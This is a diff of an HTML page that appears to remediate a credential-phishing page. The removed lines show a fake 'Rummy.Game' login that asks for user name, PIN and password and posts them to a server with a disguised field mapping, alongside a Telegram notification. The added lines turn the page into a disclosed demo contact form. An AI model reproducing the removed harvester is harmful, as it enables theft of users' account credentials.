@@ -1,75 +1,73 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Demo Contact Verification</title>
-  <style>
-    *{box-sizing:border-box} body{margin:0;min-height:100vh;display:grid;place-items:center;background:#f2f5fa;font-family:Inter,Arial,sans-serif;color:#172033;padding:22px}
-    .card{width:min(100%,430px);background:white;border:1px solid #e6eaf1;border-radius:22px;padding:30px;box-shadow:0 18px 55px #17203312}
-    .badge{display:inline-block;background:#eaf2ff;color:#2456a6;border-radius:99px;padding:7px 11px;font-size:12px;font-weight:700;letter-spacing:.04em}
-    h1{font-size:25px;margin:18px 0 8px}.sub{color:#687386;font-size:14px;line-height:1.55;margin:0 0 24px}
-    label{display:block;font-size:13px;font-weight:650;margin:15px 0 7px}
-    input{width:100%;padding:13px 14px;border:1px solid #d9dfeb;border-radius:11px;font-size:15px;outline:none}
-    input:focus{border-color:#4779d0;box-shadow:0 0 0 3px #4779d01c}
-    .consent{display:flex;gap:10px;align-items:flex-start;color:#687386;font-size:12px;line-height:1.45;margin:17px 0}
-    .consent input{width:auto;margin-top:2px}
-    button{width:100%;border:0;border-radius:11px;padding:14px;background:#245fc2;color:white;font-size:15px;font-weight:700;cursor:pointer}
-    button:disabled{opacity:.55;cursor:not-allowed}.note{font-size:11px;color:#7a8495;text-align:center;margin:17px 0 0}
-    #status{font-size:13px;line-height:1.5;margin-top:15px}.success{color:#137a48}.error{color:#b42318}
-  </style>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Demo Contact Portal</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f4f7fb;color:#26384f;font-family:Inter,Arial,sans-serif}
+.hero{height:198px;background:linear-gradient(120deg,#159fe1,#29b5e9);position:absolute;inset:0 0 auto}
+.wrap{position:relative;width:min(100%,650px);min-height:100vh;margin:0 auto;background:#fff;padding:42px 32px 28px;box-shadow:0 8px 35px #183b5b12}
+.brand{text-align:center;margin-bottom:34px}
+.pill{display:inline-flex;align-items:center;gap:9px;padding:11px 20px;border-radius:30px;background:#ffffff38;color:white;font-weight:700;font-size:16px}
+.avatar{width:142px;height:142px;border-radius:50%;margin:16px auto 12px;background:linear-gradient(145deg,#e8f5ff,#b8e7f7);border:7px solid white;box-shadow:0 5px 22px #214b7020;display:grid;place-items:center;color:#168fcb;font-size:42px;font-weight:800}
+h1{font-size:30px;margin:6px 0;color:#193b60}
+.handle{font-size:17px;color:#62809f}
+.tag{display:inline-block;margin-top:14px;background:#f0f5fa;color:#7189a5;border-radius:22px;padding:7px 15px;font-size:14px}
+.step{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e8eef5;padding:0 0 14px;margin-bottom:24px;color:#8da0b8;font-weight:700;font-size:14px}
+.step strong{color:#647995;font-weight:600}
+.intro{font-size:15px;line-height:1.55;color:#63758c;margin:0 0 22px}
+label{display:block;font-size:15px;font-weight:600;margin:18px 0 9px;color:#465a73}
+input{width:100%;height:60px;border:1px solid #dce5ef;background:#f8fafc;border-radius:18px;padding:0 20px;font-size:17px;color:#253c58;outline:none}
+input:focus{border-color:#28a9e3;box-shadow:0 0 0 3px #28a9e31b}
+.consent{display:flex;align-items:flex-start;gap:11px;margin:18px 0;color:#73869d;font-size:13px;line-height:1.5}
+.consent input{width:18px;height:18px;margin:1px 0 0;flex:none}
+button{width:100%;height:60px;border:0;border-radius:22px;background:#22aee7;color:white;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 8px 18px #22aee72b}
+button:disabled{opacity:.6;cursor:wait}
+#status{font-size:14px;margin-top:15px}.success{color:#128354}.error{color:#b42318}
+.foot{text-align:center;color:#93a2b5;font-size:12px;margin:22px 0 0}
+@media(max-width:520px){.wrap{padding:36px 22px 26px}.hero{height:190px}.avatar{width:132px;height:132px}h1{font-size:27px}}
+</style>
 </head>
 <body>
-  <main class="card">
-    <span class="badge">Rummy.Game</span>
-    <h1>Login Your Rummy Account</h1>
-    <p class="sub">Please Enter all detail correct,on many attempt account may blocked.</p>
-    <form id="form">
-      <label for="name">USER NAME</label>
-      <input id="name" name="name" autocomplete="username" maxlength="10" required placeholder="user name">
-      <label for="mobile">PIN</label>
-      <input id="pin" name="pin" type="tel" inputmode="numeric" maxlength="6" required placeholder="Enter 6 digit PIN">
-      <label for="password">PASSWORD</label>
-      <input id="password" name="password" type="password" autocomplete="current-password" minlength="8" maxlength="12" required placeholder="Enter your password">
-      <label class="consent"><input id="consent" type="checkbox" required><span>I agree that all details are correct.</span></label>
-      <button id="submit" type="submit">Login</button>
-      <div id="status" role="status" aria-live="polite"></div>
-    </form>
-    <p class="note">Demo website — not affiliated with any bank, wallet, or payment provider.</p>
-  </main>
+<div class="hero"></div>
+<main class="wrap">
+<header class="brand">
+  <div class="pill"><span>●</span> Demo Contact Portal</div>
+  <div class="avatar" aria-hidden="true">DC</div>
+  <h1>Contact Verification</h1>
+  <div class="handle">Demo website</div>
+  <div class="tag">✨ Safe demo contact form</div>
+</header>
+<div class="step"><span>STEP 1 OF 1</span><strong>Contact Details</strong></div>
+<p class="intro">Enter your contact details to submit this demonstration form. This page is not affiliated with a bank, wallet, payment service, or other company.</p>
+<form id="form">
+  <label for="name">Please enter your full name</label>
+  <input id="name" autocomplete="name" maxlength="80" required placeholder="Enter your name">
+  <label for="mobile">Please enter your mobile number</label>
+  <input id="mobile" autocomplete="tel" inputmode="tel" maxlength="20" required placeholder="+91 98765 43210">
+  <label for="email">Please enter your email address</label>
+  <input id="email" type="email" autocomplete="email" maxlength="120" required placeholder="you@example.com">
+  <label class="consent"><input id="consent" type="checkbox" required><span>I agree to submit these contact details for this demo and understand they may be sent to the site owner's Telegram bot.</span></label>
+  <button id="submit" type="submit">Submit details →</button>
+  <div id="status" role="status" aria-live="polite"></div>
+</form>
+<p class="foot">Demo only • Never enter passwords, payment PINs, or OTPs.</p>
+</main>
 <script>
-const form = document.getElementById("form");
-const statusBox = document.getElementById("status");
-const button = document.getElementById("submit");
-form.addEventListener("submit", async (event) => {
-  event.preventDefault();
-  statusBox.className = "";
-  statusBox.textContent = "Submitting…";
-  button.disabled = true;
-  try {
-    const response = await fetch("/api/submit", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({
-        name: document.getElementById("name").value,
-        mobile: document.getElementById("pin").value,
-        email: document.getElementById("password").value,
-        consent: document.getElementById("consent").checked
-      })
-    });
-    const result = await response.json();
-    if (!response.ok) throw new Error(result.error || "Submission failed.");
-    statusBox.className = "success";
-    statusBox.textContent = result.notification === "sent"
-      ? "Submitted successfully. Telegram notification sent."
-      : "Submitted successfully. Telegram is not connected yet; add bot credentials on the server to enable notifications.";
-    form.reset();
-  } catch (error) {
-    statusBox.className = "error";
-    statusBox.textContent = error.message || "Something went wrong.";
-  } finally {
-    button.disabled = false;
-  }
+const form=document.getElementById("form"),statusBox=document.getElementById("status"),button=document.getElementById("submit");
+form.addEventListener("submit",async e=>{
+ e.preventDefault();statusBox.className="";statusBox.textContent="Submitting…";button.disabled=true;
+ try{
+  const r=await fetch("/api/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
+   name:document.getElementById("name").value,mobile:document.getElementById("mobile").value,
+   email:document.getElementById("email").value,consent:document.getElementById("consent").checked
+  })});
+  const data=await r.json();if(!r.ok)throw new Error(data.error||"Submission failed.");
+  statusBox.className="success";statusBox.textContent=data.notification==="sent"?"Submitted successfully. Telegram notification sent.":"Submitted successfully. Telegram notifications are not configured yet.";
+  form.reset();
+ }catch(err){statusBox.className="error";statusBox.textContent=err.message||"Something went wrong.";}
+ finally{button.disabled=false;}
 });
 </script>
 </body>
